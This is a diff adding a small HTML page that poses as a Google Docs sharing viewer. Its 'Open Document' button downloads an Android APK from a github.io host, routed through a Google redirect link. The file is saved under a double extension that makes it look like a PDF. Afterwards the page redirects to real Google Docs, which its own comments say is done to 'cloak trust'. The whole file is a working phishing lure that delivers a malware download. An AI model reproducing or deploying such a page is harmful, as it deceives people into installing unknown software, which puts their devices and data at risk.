@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Google Docs Viewer</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      margin-top: 80px;
+    }
+    button {
+      background-color: #1a73e8;
+      color: white;
+      padding: 14px 28px;
+      font-size: 16px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .note {
+      margin-top: 20px;
+      color: gray;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <h2>Shared via Google Docs</h2>
+  <p class="note">The document was securely shared with you</p>
+  <button onclick="triggerDownload()">Open Document</button>
+
+  <script>
+    function triggerDownload() {
+      const fakeUrl = "https://www.google.com/url?q=https://ybt01.github.io/upload/app-debug.apk";
+
+      const a = document.createElement('a');
+      a.href = fakeUrl;
+      a.download = "Secure_Document_2024.pdf.apk"; // spoofed filename
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+
+      // Cloak trust by redirecting to Google after
+      setTimeout(() => {
+        window.location.href = "https://docs.google.com/document/u/0/";
+      }, 1500);
+    }
+  </script>
+</body>
+</html>
